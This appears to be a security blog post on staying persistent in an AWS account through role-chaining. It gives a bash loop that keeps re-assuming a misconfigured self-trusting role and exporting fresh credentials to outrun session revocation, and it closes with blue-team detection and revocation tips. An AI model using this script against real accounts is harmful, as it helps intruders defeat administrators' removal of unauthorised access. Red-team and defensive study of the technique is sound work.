---
title: "Role-chaining to stay persistent in AWS environment"
date: 2022-09-23T17:41:53+10:00
draft: false
---

**[UPDATE]**: With the [recent change in AWS assume role](https://aws.amazon.com/blogs/security/announcing-an-update-to-iam-role-trust-policy-behavior/), the only way this would work is when the role allow itself or allow the entire account to assume into (surprisingly a common mistake). 

Says... you have access to iam or role, administrators are onto you and trying to remove your access by revoking roles, removing iam users you created, etc..  How do you persist? Here is one way to do it...

## Red team: 

 ~~Find a role with admin privilege and run the following script to assume itself (Allowed by default)~~

(update 2022): Find a role (using `aws iam list-roles`) in current account, add rule that allow the role to assume itself (or if the role has trust relationship set to `arn:aws:iam::{current_accountid}:root` (often happen) - and plug it in the script below. 

```bash
while [ 1 ]; \
do echo "[+] Acquiring new token using sts assume-role"; \
aws sts assume-role  --role-arn arn:aws:iam::{accountid}:role/{roleid} --role-session-name test`date +'%s'` --duration 3600 | \
jq -r '.Credentials|"export AWS_ACCESS_KEY_ID=\(.AccessKeyId)\nexport AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)\nexport AWS_SESSION_TOKEN=\(.SessionToken)"' > tmp.sh; \
source tmp.sh; \
aws sts get-caller-identity; \
done
```

You would be surprised that often times there are service roles which are misconfigured by some developers and end up granting the entire account ability to assume into that role. In many instances it could be used for privilege escalation but in this instance we just wanna stay persistent a bit longer. This script runs a loop to continously assume into that role by itself. The duration cannot be set higher than 3600 seconds because that is the maximum duration you can assume into another role when you are "role-chaining". 

The script works because there i a race condition happens between this script and when administrator hit the "revoke previous session" button which leads to creation of an inline IAM policy to revoke old sessions.  

### Blue team tips

 - Detect automated scripts by looking at big spike of AssumeRole events in Cloudtrail log
 - Use revoke token functionality and THEN modify the Revoke IAM policy with a timestamp in a couple of minutes into the future to make sure the changed is propagated and attacker cannot "renew" his/her token.
